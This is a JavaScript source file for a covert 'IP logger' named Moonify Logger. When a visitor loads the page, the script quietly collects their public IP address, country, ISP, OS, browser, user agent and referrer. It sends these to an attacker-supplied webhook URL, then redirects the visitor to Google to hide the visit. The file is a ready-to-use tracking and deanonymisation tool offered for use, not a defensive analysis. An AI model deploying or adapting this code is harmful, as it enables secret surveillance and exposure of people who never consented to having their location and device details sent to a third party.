/*

https://github.com/Yuvi5001 | https://github.com/Yuvi5001/moonify-logger | https://dsc.gg/yvvi

*/


async function sendWebhookMessage(clientIP, clientData) {

   const webhookURL = "change this to your webhook";

   const options = {
      method: 'POST',
      headers: {
         'Content-Type': 'application/json'
      },
      body: JSON.stringify({
         embeds: [{
            title: `Moonify Logger`,
            color: 16711680,
            description: `**IP Address:** ${clientIP}\n\n` +
               `**Operating System:** ${clientData.os}\n\n` +
               `**Country:** ${clientData.country}\n\n` +
               `**Date/Time:** ${clientData.datetime}\n\n` +
               `**Browser:** ${clientData.browser}\n\n` +
               `**User Agent:** ${clientData.userAgent}\n\n` +
               `**Referring URL:** ${clientData.referrer}\n\n` +
               `**Host Name:** ${clientData.hostname}\n\n` +
               `**ISP:** ${clientData.isp}`
         }]
      }),
   };
   await fetch(webhookURL, options)
      .then(response => console.log(`Successfully sent data`))
      .catch(error => console.error(`Error sending data: ${error}`));
}

fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(async data => {
      const clientIP = data.ip;
      let country, isp;
      await fetch(`https://ipapi.co/${clientIP}/json/`)
         .then(response => response.json())
         .then(data => {
            country = data.country_name;
            isp = data.org;
         });
      const userAgent = navigator.userAgent;
      let browserName, browserVersion;
      if (userAgent.indexOf("Chrome") !== -1) {
         browserName = "Chrome";
         browserVersion = userAgent.match(/Chrome\/(\d+)/)[1];
      } else if (userAgent.indexOf("Firefox") !== -1) {
         browserName = "Firefox";
         browserVersion = userAgent.match(/Firefox\/(\d+)/)[1];
      } else if (userAgent.indexOf("Safari") !== -1) {
         browserName = "Safari";
         browserVersion = userAgent.match(/Version\/(\d+)/)[1];
      }

      const clientData = {
         os: navigator.platform,
         country: country,
         datetime: new Date().toLocaleString(),
         browser: `${browserName} ${browserVersion}`,
         userAgent: navigator.userAgent,
         referrer: document.referrer,
         hostname: window.location.hostname,
         isp: isp
      };
      await sendWebhookMessage(clientIP, clientData);

      window.location.replace("https://www.google.com/");

   });
